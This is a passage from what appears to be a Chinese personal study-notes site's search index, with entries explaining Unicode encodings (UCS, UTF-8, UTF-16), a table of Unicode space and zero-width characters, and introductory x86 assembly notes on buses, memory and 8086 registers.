22238-2008\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55B\u201d\uff09\u4f7f\u7528\u79c1\u4eba\u4f7f\u7528\u533a\u5b58\u653e\u85cf\u6587\u8fde\u5b57","title":"\u5b57\u7b26\u5e73\u9762\u6620\u5c04"},{"location":"cs/unicode/#_2","text":"Unicode \u6709\u4e24\u79cd\u5b57\u7b26\u6620\u5c04\u65b9\u5f0f\uff0cUTF\uff08Unicode Transformation Format\uff09\u7f16\u7801\u548c UCS\uff08Universal Coded Character Set\uff09\u7f16\u7801\uff0c\u5177\u4f53\u6765\u8bf4\u6709 UCS-2\u3001UCS-4\u3001UTF-1\u3001UTF-8\u3001UTF-16\u3001UTF-32 \u7b49","title":"\u7f16\u7801"},{"location":"cs/unicode/#ucs","text":"UCS-2 \uff0cUniversal Character Set coded in 2 octets\uff0c\u5373\u7528\u4e24\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u8303\u56f4\u4ece U+0000 \u5230 U+FFFF\u3002\u4e5f\u5c31\u662f\u8bf4 UCS-2 \u53ea\u80fd\u8868\u793a BMP \u5e73\u9762\u4e0a\u7684\u5b57\u7b26 UCS-4 \uff0c\u540c\u7406\uff0c\u7528\u56db\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ece U+00000000 \u5230 U+FFFFFFFF\uff0c\u53ef\u4ee5\u8868\u793a\u6240\u6709 Unicode \u5b57\u7b26\uff08UCS-4 \u4e0e UTF-32 \u5b8c\u5168\u7b49\u4ef7\uff09 \u4f46\u662f\u8fd9\u4e24\u79cd\u65b9\u6848\u90fd\u4f1a\u5bfc\u81f4\u7f16\u7801\u540e\u6709\u5927\u91cf\u7684 0x00 \u5b57\u8282\uff0c\u5360\u7a7a\u95f4\uff0c\u6240\u4ee5\u4e5f\u5c31\u6709\u4e86\u53ef\u53d8\u957f\u5ea6\u7684 UTF \u7f16\u7801","title":"UCS"},{"location":"cs/unicode/#utf-8","text":"UTF-8 \u7f16\u7801\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u53d8\u5bbd\u5ea6\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u503c\u4f1a\u88ab\u7f16\u7801\u4e3a 1 \u5230 4 \u4e2a\u5b57\u8282 \u5177\u4f53\u6309\u7167\u4e0b\u9762\u7684\u7f16\u7801\u65b9\u5f0f\uff1a \u5b57\u7b26\u503c\u8303\u56f4 \u7b2c\u4e00\u5b57\u8282 \u7b2c\u4e8c\u5b57\u8282 \u7b2c\u4e09\u5b57\u8282 \u7b2c\u56db\u5b57\u8282 U+0000 ~ U+007F 0 xxxxxxx U+0080 ~ U+07FF 110 xxxxx 10 xxxxxx U+0800 ~ U+FFFF 1110 xxxx 10 xxxxxx 10 xxxxxx U+10000 ~ U+10FFFF 11110 xxx 10 xxxxxx 10 xxxxxx 10 xxxxxxx \u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210\u7684 0\uff1a\u5f53\u524d\u8fd9\u4e00\u4e2a\u5b57\u8282\u5c31\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u503c 110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e24\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e00\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 1110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e09\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e24\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 11110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u56db\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e09\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 10\uff1a\u5f53\u524d\u5b57\u8282\u662f\u4e00\u4e2a\u5b57\u7b26\u503c\u7684\u4e00\u90e8\u5206 \u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u56db\u4e2a\u5b57\u8282\u65f6\u5269\u4f59\u7684\u6570\u636e\u6bd4\u7279\u4e3a 12 \u4e2a\uff0c\u6b63\u597d\u662f Unicode \u89c4\u5b9a\u7684\u6700\u5927\u5bb9\u91cf \u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u70b9\uff1a U+0000 ~ U+007F \u8fd9 128 \u4e2a\u5b57\u7b26\u503c\u5168\u90e8\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u6765\u8868\u793a\uff0c\u5e76\u4e14\u524d\u7f00\u4e3a 0\uff0c\u5373\u7f16\u7801\u540e\u7684\u5b57\u8282\u503c\u548c\u5b57\u7b26\u503c\u76f8\u540c\u3002\u800c\u4e14\u8fd9 128 \u4e2a\u5b57\u7b26\u6b63\u597d\u662f ASCII \u7f16\u7801\u4e2d\u89c4\u5b9a\u7684\u5b57\u7b26\uff0c\u4f7f\u5f97 UTF-8 \u7f16\u7801\u5b8c\u5168\u517c\u5bb9 ASCII \u7f16\u7801 \u5728 BMP \u5e73\u9762\u4e2d\u7684 CJK \u5b57\u7b26\u90fd\u4f1a\u7f16\u7801\u4e3a 3 \u4e2a\u5b57\u8282 BMP \u5e73\u9762\u4f1a\u7f16\u7801\u4e3a 1~3 \u4e2a\u5b57\u8282\uff0c\u800c\u5269\u4f59\u7684\u5176\u4ed6\u5e73\u9762\u5747\u4f1a\u7f16\u7801\u4e3a 4 \u4e2a\u5b57\u8282","title":"UTF-8"},{"location":"cs/unicode/#utf-16","text":"UTF-16 \u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u503c\u7f16\u7801\u4e3a 1~2 \u4e2a 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff08\u5373 2 \u6216 4 \u4e2a\u5b57\u8282\uff09 \u5b83\u7684\u7f16\u7801\u65b9\u5f0f\u5206\u4e3a\u4e24\u7c7b\uff1a U+0000 ~ U+FFFF \u8303\u56f4 BMP \u7684\u5168\u90e8\u90e8\u5206\uff0c\u7f16\u7801\u503c\u548c\u7801\u4f4d\u76f8\u540c\uff0c\u5373\u76f4\u63a5\u5c06\u7801\u4f4d\u4f5c\u4e3a\u4e24\u4e2a\u5b57\u8282\u7684\u7f16\u7801 U+10000 ~ U+10FFFF \u8303\u56f4 \u6240\u6709\u7684\u8f85\u52a9\u5e73\u9762\u4e0a\u7684\u7801\u4f4d\u4f1a\u88ab\u7f16\u7801\u4e3a\u4e00\u5bf9 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff0c\u79f0\u4e3a\u4ee3\u7406\u5bf9\uff08Surrogate Pair\uff09 \u7801\u4f4d\u51cf 0x10000\uff0c\u4f7f\u8303\u56f4\u843d\u5728 0x00000 \u5230 0xFFFFF\uff0c\u5373 20 \u6bd4\u7279 \u9ad8\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xD800 \u5f97\u5230\u7b2c\u4e00\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u9ad8\u4f4d\u4ee3\u7406\uff08high surrogate\uff09\u6216\u524d\u5bfc\u4ee3\u7406\uff08lead surrogate\uff09 \u4f4e\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xDC00 \u5f97\u5230\u7b2c\u4e8c\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u4f4e\u4f4d\u4ee3\u7406\uff08low surrogate\uff09\u6216\u540e\u5c3e\u4ee3\u7406\uff08trail surrogate\uff09 \u8fd9\u6837\u7f16\u7801\u4e4b\u540e\u9ad8\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xD800 ~ 0xDBFF\uff0c\u4f4e\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xDC00 ~ 0xDFFF \u800c U+D800 ~ U+DFFF \u8fd9\u4e9b\u7801\u4f4d\u5728 BMP \u4e2d\u5df2\u7ecf\u9884\u7559\u4e86\u51fa\u6765\u4e0d\u8868\u793a\u4efb\u4f55\u5b57\u7b26\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u91cd\u53e0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bc6\u522b\u51fa\u6765\u662f\u600e\u4e48\u7f16\u7801\u7684 UTF-16 \u4e0e UTF-8 \u76f8\u6bd4\uff0c\u597d\u5904\u662f\u5927\u90e8\u5206\u5b57\u7b26\u90fd\u53ef\u4ee5\u7f16\u7801\u4e3a\u56fa\u5b9a\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u800c\u574f\u5904\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u4e0e ASCII \u5b8c\u5168\u4e0d\u517c\u5bb9","title":"UTF-16"},{"location":"cs/unicode/#_3","text":"","title":"\u90e8\u5206\u7279\u6b8a\u5b57\u7b26"},{"location":"cs/unicode/#_4","text":"Unicode \u4e2d\u7684\u7a7a\u683c\u4e5f\u6709\u5f88\u591a\u79cd\uff0c\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\u3001\u4ee5\u53ca\u610f\u4e49\uff08\u4e00\u4e9b\u96f6\u5bbd\u5b57\u7b26\u4e5f\u63a5\u5728\u8868\u540e\u9762\u4e86\uff09 [data-md-color-scheme=\"default\"] .space { white-space: pre; padding: 0; background-color: #000000DE; display: inline-block; line-height: 1; } [data-md-color-scheme=\"slate\"] .space { white-space: pre; padding: 0; background-color: #FFFFFFE6; display: inline-block; line-height: 1; } \u7801\u4f4d \u540d\u79f0 \u5bbd\u5ea6 \u610f\u4e49/\u7528\u9014 U+0020 SPACE ASCII \u7a7a\u683c\uff0c\u76f4\u63a5\u6253\u7a7a\u683c\u5c31\u662f\u8fd9\u4e2a U+00A0 NO-BREAK SPACE \u548c U+0020 \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u4f1a\u65ad\u884c\uff0cHTML \u5b9e\u4f53 &nbsp; U+1680 OGHAM SPACE MARK \u1680 \u6b27\u7518\u6587\u7a7a\u683c U+2000 EN QUAD \u2002 \u534a\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2002 \u66ff\u4ee3 U+2001 EM QUAD \u2003 \u5168\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2003 \u66ff\u4ee3 U+2002 EN SPACE \u2002 \u534a\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &ensp; U+2003 EM SPACE \u2003 \u5168\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &emsp; U+2004 THREE-PER-EM SPACE \u2004 \u4e09\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/3\uff0c &emsp13; U+2005 FOUR-PER-EM SPACE \u2005 \u56db\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/4\uff0c &emsp14; U+2006 SIX-PER-EM SPACE \u2006 \u516d\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/6 U+2007 FIGURE SPACE \u2007 \u6570\u5b57\u7a7a\u683c\uff0c\u5728\u6709\u7b49\u5bbd\u6570\u5b57\u7684\u5b57\u4f53\u4e2d\u5bbd\u5ea6\u548c\u4e00\u4e2a\u6570\u5b57\u5bbd\u5ea6\u4e00\u81f4\uff0c &numsp; U+2008 PUNCTUATION SPACE \u2008 \u7b26\u53f7\u7a7a\u683c\uff0c\u4e0e\u7a84\u6807\u70b9\u7b26\u53f7\u5bbd\u5ea6\u4e00\u81f4\uff0c &puncsp; U+2009 THIN SPACE \u2009 \u8584\u7a7a\u683c\uff0c\u5bbd\u5ea6\u4e0d\u56fa\u5b9a\uff0c &thinsp; U+200A HAIR SPACE \u200a \u5934\u53d1\u7a7a\u683c\uff0c\u6bd4\u8584\u7a7a\u683c\u66f4\u7a84\uff0c &hairsp; U+202F NARROW NO-BREAK SPACE \u202f \u7a84\u7684\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u5728\u8499\u53e4\u8bed\u4e2d\u5bbd\u5ea6\u7c7b\u4f3c\u4e09\u5206\u5bbd\uff0c\u5176\u4ed6\u7c7b\u4f3c U+2009 U+205F MEDIUM MATHEMATICAL SPACE \u205f \u4e2d\u7b49\u6570\u5b66\u7a7a\u683c\uff0c4/18\u5bbd\uff0c\u7528\u4e8e\u6570\u5b66\u516c\u5f0f\u4e2d\u7b26\u53f7\u4e24\u4fa7\uff0c &MediumSpace; U+3000 IDEOGRAPHIC SPACE \u3000 \u8868\u610f\u7a7a\u683c\uff0cCJK \u8868\u610f\u6587\u5b57\u4f7f\u7528\u7684\u5168\u89d2\u7a7a\u683c U+200B ZERO WIDTH SPACE \u96f6\u5bbd\u7a7a\u683c\uff0c &ZeroWidthSpace; U+200C ZERO WIDTH NON-JOINER \u96f6\u5bbd\u4e0d\u8fde\u5b57\uff0c\u7528\u6765\u963b\u6b62\u5e26\u8fde\u5b57\u5b57\u4f53\u7684\u8fde\u5b57\uff0c &zwnj; U+200D ZERO WIDTH JOINER \u96f6\u5bbd\u8fde\u5b57\uff0c\u53ef\u4ee5\u8bf1\u5bfc\uff08\u5982\u8868\u60c5\u7b26\u53f7\u548c\u50e7\u4f3d\u7f57\u8bed\uff09\u6216\u6291\u5236\uff08\u5982\u68b5\u6587\uff09\u7528\u5355\u4e2a\u5b57\u5f62\u66ff\u6362\uff0c &zwj; U+2060 WORD JOINER \u96f6\u5bbd\u8bcd\u8fde\u63a5\u7b26\uff0c\u4e0d\u4f1a\u5728\u8bcd\u95f4\u65ad\u884c\uff0c &NoBreak; U+FEFF ZERO WIDTH NO-BREAK SPACE \u96f6\u5bbd\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u73b0\u7528\u4f5c\u6807\u8bb0\u5927\u5c0f\u7aef\u5e8f","title":"\u7a7a\u683c"},{"location":"cs/unicode/#_5","text":"\u8be6\u89c1 \u4e0d\u79bb\u4e0d\u5f03\u7684\u7834\u6298\u53f7 - The Type","title":"\u6a2a\u7ebf"},{"location":"cs/pl/","text":"Programming Language \u00b6 Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u65f6\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u6bd4\u5982 Haskell\uff09\uff0c\u6709\u7684\u662f\u96f6\u96f6\u6563\u6563\u7684\u77e5\u8bc6\u70b9 \u800c\u4e14\u8fd8\u6709\u4e00\u4e9b\u8bed\u8a00\u6ca1\u5199\u7b14\u8bb0\uff08\u9003 Table of Contents \u00b6 C/C++ Haskell x86 Assembly RISC-V ISA","title":"Programming Language"},{"location":"cs/pl/#programming-language","text":"Abstract \u8fd9\u91cc\u5f52\u6863\u4e00\u4e9b\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u65f6\u7684\u7b14\u8bb0 \u6709\u7684\u662f\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff08\u6bd4\u5982 Haskell\uff09\uff0c\u6709\u7684\u662f\u96f6\u96f6\u6563\u6563\u7684\u77e5\u8bc6\u70b9 \u800c\u4e14\u8fd8\u6709\u4e00\u4e9b\u8bed\u8a00\u6ca1\u5199\u7b14\u8bb0\uff08\u9003","title":"Programming Language"},{"location":"cs/pl/#table-of-contents","text":"C/C++ Haskell x86 Assembly RISC-V ISA","title":"Table of Contents"},{"location":"cs/pl/asm/","text":"x86 \u6c47\u7f16\u8bed\u8a00 \u00b6 Abstract \u81ea\u5b66\uff0c\u770b\u4e66\u300a\u6c47\u7f16\u8bed\u8a00\uff08\u7b2c4\u7248\uff09\u300b\u738b\u723d \u6d59\u6c5f\u5927\u5b66\u767d\u6d2a\u6b22\u8001\u5e08 \u201c\u6c47\u7f16\u8bed\u8a00\u201d\uff08\u5927\u4e00\u6625\u590f\uff09\u8bfe\u7a0b https://faydoc.tripod.com/cpu/index.htm \u57fa\u7840\u77e5\u8bc6 \u00b6 \u4e00\u4e9b\u4ec5\u4f9b\u4e86\u89e3\u7684\u4e1c\u897f \u673a\u5668\u8bed\u8a00\uff1a\u673a\u5668\u6307\u4ee4\uff08\u4e8c\u8fdb\u5236\u6570\uff09\u7684\u96c6\u5408 CPU \u53ef\u4ee5\u6267\u884c\u673a\u5668\u6307\u4ee4\uff0c\u8fdb\u884c\u8fd0\u7b97 \u6c47\u7f16\u8bed\u8a00\u4e3b\u4f53\u662f\u6c47\u7f16\u6307\u4ee4\uff0c\u6c47\u7f16\u6307\u4ee4\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u673a\u5668\u7801\u7ed9\u8ba1\u7b97\u673a\u6267\u884c \u5bc4\u5b58\u5668\uff1aCPU \u4e2d\u53ef\u4ee5\u5b58\u50a8\u6570\u636e\u7684\u5668\u4ef6 \u6c47\u7f16\u8bed\u8a00\u7ec4\u6210\uff1a \u6c47\u7f16\u6307\u4ee4\uff1a\u6709\u5bf9\u5e94\u7684\u673a\u5668\u7801\uff0c\u662f\u673a\u5668\u7801\u7684\u52a9\u8bb0\u7b26 \u4f2a\u6307\u4ee4\uff1a\u7531\u7f16\u8bd1\u5668\u6267\u884c\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u5176\u4ed6\u7b26\u53f7\uff08+-*/\u7b49\uff09\uff1a\u7531\u7f16\u8bd1\u5668\u8bc6\u522b\uff0c\u6ca1\u6709\u5bf9\u5e94\u673a\u5668\u7801 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u5b58\u653e\uff0c\u88ab CPU \u4f7f\u7528 \u6307\u4ee4\u548c\u6570\u636e\u5728\u5185\u5b58\u4e2d\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u4e8c\u8fdb\u5236\u4fe1\u606f \u8ba1\u7b97\u673a\u6700\u5c0f\u4fe1\u606f\u5355\u4f4d\u662f bit\uff0c8 \u4e2a bit \u7ec4\u6210\u4e00\u4e2a Byte\uff0c\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u53ef\u4ee5\u5b58\u50a8\u4e00\u4e2a Byte\uff088 \u4e2a\u4e8c\u8fdb\u5236\u4f4d\uff09\uff0c\u5b58\u50a8\u5355\u5143\u4ece 0 \u5f00\u59cb\u7f16\u53f7 CPU \u901a\u8fc7\u603b\u7ebf\u4e0e\u5b58\u50a8\u5668\u82af\u7247\u4f20\u8f93\u5730\u5740\u3001\u6570\u636e\u3001\u63a7\u5236\u4fe1\u606f\uff08\u603b\u7ebf\uff1a\u8fde\u63a5 CPU \u548c\u5176\u4ed6\u82af\u7247\u7684\u4e00\u5806\u5bfc\u7ebf\uff09 CPU \u4ece\u5185\u5b58\u8bfb\u53d6\u6570\u636e\u7684\u8fc7\u7a0b\uff1a CPU \u901a\u8fc7\u5730\u5740\u7ebf\u5c06\u5730\u5740\u4fe1\u606f\u53d1\u51fa CPU \u901a\u8fc7\u63a7\u5236\u7ebf\u53d1\u51fa\u5185\u5b58\u8bfb\u547d\u4ee4\uff0c\u544a\u77e5\u6307\u5b9a\u5b58\u50a8\u5668\u82af\u7247\u8981\u4ece\u4e2d\u8bfb\u53d6\u6570\u636e \u5b58\u50a8\u5668\u5c06\u6240\u9700\u5730\u5740\u5904\u7684\u6570\u636e\u901a\u8fc7\u6570\u636e\u7ebf\u9001\u7ed9 CPU CPU \u901a\u8fc7 \u5730\u5740\u603b\u7ebf \u6307\u5b9a\u5b58\u50a8\u5355\u5143\u3002\u5730\u5740\u603b\u7ebf\u4e0a\u80fd\u4f20\u9001\u591a\u5c11\u4e2a\u4e0d\u540c\u7684\u4fe1\u606f\uff0cCPU \u5c31\u53ef\u4ee5\u5bf9\u591a\u5c11\u4e2a\u5b58\u50a8\u5355\u5143\u8fdb\u884c\u5bfb\u5740 \u4e00\u4e2a CPU \u6709 n \u6839\u5730\u5740\u7ebf\uff0c\u5219\u8fd9\u4e2a CPU \u7684\u5730\u5740\u603b\u7ebf\u5bbd\u5ea6\u4e3a n\uff0c\u8fd9\u6837\u7684 CPU \u6700\u591a\u53ef\u4ee5\u5bfb\u627e 2 n \u4e2a\u5185\u5b58\u5355\u5143 CPU \u901a\u8fc7 \u6570\u636e\u603b\u7ebf \u6765\u4e0e\u5185\u5b58\u6216\u5176\u4ed6\u5668\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u3002\u6570\u636e\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u4e0e\u5916\u754c\u7684\u6570\u636e\u4f20\u9001\u901f\u5ea6 8 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e00\u4e2a 8 \u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\uff081 \u4e2a\u5b57\u8282\uff09\uff0c16 \u6839\u6570\u636e\u603b\u7ebf\u4e00\u6b21\u53ef\u4ee5\u4f20\u9001\u4e24\u4e2a\u5b57\u8282 8088 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 8\uff0c8086 CPU \u7684\u6570\u636e\u603b\u7ebf\u5bbd\u5ea6\u4e3a 16 CPU \u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u5bf9\u5916\u90e8\u5668\u4ef6\u8fdb\u884c\u63a7\u5236\u3002\u63a7\u5236\u603b\u7ebf\u7684\u5bbd\u5ea6\u51b3\u5b9a\u4e86 CPU \u5bf9\u5916\u90e8\u5668\u4ef6\u7684\u63a7\u5236\u80fd\u529b \u4e3b\u677f\u4e0a\u5668\u4ef6\u901a\u8fc7\u603b\u7ebf\u548c CPU \u76f8\u8fde CPU \u901a\u8fc7\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684\u63a5\u53e3\u5361\u95f4\u63a5\u63a7\u5236\u5916\u8bbe \u5b58\u50a8\u5668\u82af\u7247\u4ece\u8bfb\u5199\u4e0a\u5206\u4e3a \u968f\u673a\u5b58\u50a8\u5668\uff08RAM\uff09\u548c \u53ea\u8bfb\u5b58\u50a8\u5668\uff08ROM\uff09 RAM \u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u5fc5\u987b\u5e26\u7535\u5b58\u50a8\uff0c\u5173\u673a\u540e\u5185\u5bb9\u4e22\u5931 ROM \u53ea\u8bfb\u4e0d\u5199\uff0c\u4f46\u5173\u673a\u540e\u5185\u5bb9\u4e0d\u4e22\u5931 \u5b58\u50a8\u5668\u4ece\u529f\u80fd\u548c\u8fde\u63a5\u4e0a\u5206\u4e3a\uff1a \u968f\u673a\u5b58\u50a8\u5668\uff1a\u5b58\u653e\u4f9b CPU \u4f7f\u7528\u7684\u7edd\u5927\u90e8\u5206\u7a0b\u5e8f\u548c\u6570\u636e\uff0c\u7531\u88c5\u5728\u4e3b\u677f\u4e0a\u7684 RAM \u548c\u63d2\u5728\u6269\u5c55\u63d2\u69fd\u4e0a\u7684 RAM \u7ec4\u6210 \u88c5\u6709 BIOS \u7684 ROM\uff1a\u5382\u5546\u63d0\u4f9b\u7684\u8f6f\u4ef6\u7cfb\u7edf\uff0c\u901a\u8fc7\u5b83\u5229\u7528\u8be5\u786c\u4ef6\u8bbe\u5907\u8fdb\u884c\u6700\u57fa\u672c\u7684\u8f93\u5165\u8f93\u51fa \u63a5\u53e3\u5361\u4e0a\u7684 RAM\uff1a\u67d0\u4e9b\u63a5\u53e3\u5361\u9700\u8981\u5bf9\u5927\u6279\u91cf\u8f93\u5165\u3001\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u6682\u65f6\u5b58\u50a8\uff0c\u5728\u5176\u4e0a\u88c5\u6709 RAM\uff08\u5982\u663e\u5b58\uff09 CPU \u5728\u64cd\u63a7\u5b58\u50a8\u5668\u7684\u65f6\u5019\uff0c\u628a\u5b83\u4eec\u5f53\u4f5c\u5185\u5b58\u6765\u5bf9\u5f85\uff0c\u628a\u5b83\u4eec\u603b\u7684\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u5373\u5185\u5b58\u5730\u5740\u7a7a\u95f4 \u6240\u6709\u7269\u7406\u5b58\u50a8\u5668\u88ab\u770b\u4f5c\u4e00\u4e2a\u7531\u82e5\u5e72\u5b58\u50a8\u5355\u5143\u7ec4\u6210\u7684\u903b\u8f91\u5b58\u50a8\u5668\uff0c\u6bcf\u4e2a\u7269\u7406\u5b58\u50a8\u5668\u5728\u5176\u4e2d\u5360\u6709\u4e00\u4e2a\u5730\u5740\u6bb5\uff0c\u5373\u5730\u5740\u7a7a\u95f4 \u6570\u636e\u7684\u8868\u793a\u4e0e\u7ec4\u7ec7 \u00b6 \u4e8c\u8fdb\u5236\u6570\u672b\u5c3e\u7528 B/b \u4f5c\u540e\u7f00\uff0c\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u7528 H/h \u4f5c\u540e\u7f00\u4e14\u5982\u679c\u5f00\u5934\u4e3a\u5b57\u6bcd\u5219\u8981\u5728\u524d\u9762\u52a0\u4e00\u4e2a 0\uff0c\u516b\u8fdb\u5236\u672b\u5c3e\u7528 Q/q \u4f5c\u540e\u7f00\uff0c\u5341\u8fdb\u5236\u4e0d\u7528\u540e\u7f00 \u4e00\u4e2a\u4e8c\u8fdb\u5236\u4f4d\u53eb\u4e00\u4f4d\uff08bit\uff09\uff0c\u56db\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u534a\u5b57\u8282\uff08nibble\uff09\uff0c\u516b\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\u8282\uff08byte\uff09\uff0c\u5341\u516d\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u5b57\uff08word\uff09\uff0c\u4e09\u5341\u4e8c\u4e2a\u4f4d\u53eb\u4e00\u4e2a\u53cc\u5b57\uff08double word\uff09 \u5b57\u7b26\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5355\u5f15\u53f7\u62ec\u5b57\u7b26\u6765\u8868\u793a\uff0c\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94 ASCII \u7801\u6765\u8868\u793a \u5185\u90e8\u5bc4\u5b58\u5668 \u00b6 8086 \u5185\u90e8\u4e00\u5171\u6709 14 \u4e2a 16 \u4f4d\u5bc4\u5b58\u5668\uff0c8 \u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c4 \u4e2a\u6bb5\u5bc4\u5b58\u5668\uff0c2 \u4e2a\u63a7\u5236\u5bc4\u5b58\u5668 \u901a\u7528\u5bc4\u5b58\u5668 \u6570\u636e\u5bc4\u5b58\u5668\uff1aax bx cx dx\uff0c\u7528\u4e8e\u5b58\u653e\u6570\u636e\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 16 \u4f4d\uff0c\u53ef\u5206\u4e3a\u9ad8\u4f4e 8 \u4f4d\uff0c\u9ad8 8 \u4f4d\u5206\u522b\u4e3a ah bh ch dh\uff0c\u4f4e\u516b\u4f4d\u5206\u522b\u4e3a al bl cl dl\uff0c\u4e14\u5982\u679c\u53ea\u4fee\u6539\u516b\u4f4d\uff0c\u5219\u4e0d\u4f1a\u5f71\u54cd\u5230\u53e6\u5916\u516b\u4f4d\uff08\u6bd4\u5982\u6ea2\u51fa\u4e0d\u4f1a\u4ece al \u6ea2\u51fa\u5230 ah\uff09 ax\uff1a\u7d2f\u52a0\u5668\uff0c\u5e38\u7528\u4f5c\u7d2f\u52a0\uff0c\u4e14\u5728\u4e58\u9664\u6cd5\u3001\u4e32\u8fd0\u7b97\u3001IO \u4e2d\u6709\u4e13\u95e8\u7528\u5904 bx\uff1a\u57fa\u5740\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u6765\u5b58\u653e\u5bfb\u5740\u7684\u57fa\u5740 cx\uff1a\u8ba1\u6570\u5bc4\u5b58\u5668\uff0c\u5e38\u7528\u5728\u5faa\u73af\u4e2d\u4f5c\u4e3a\u8ba1\u6570\u5668 dx\uff1a\u6570\u636e\u5bc4\u5b58\u5668\uff0c\u5b58\u653e IO \u7aef\u53e3\u5730\u5740\uff0c\u4e14\u5728\u53cc\u5b57\u8fd0\u7b97\u4e2d\u4f5c\u4e3a ax \u7684\u6269\u5c55\u9ad8\u5341\u516d\u4f4d \u53d8\u5740\u5bc4\u5b58\u5668\uff1asi di\uff0c\u5e38\u7528\u6765\u5bfb\u5740 si\uff1a\u6e90\u53d8\u5740\u5bc4\u5b58\u5668 di\uff1a\u76ee\u7684\u53d8\u5740\u5bc4\u5b58\u5668 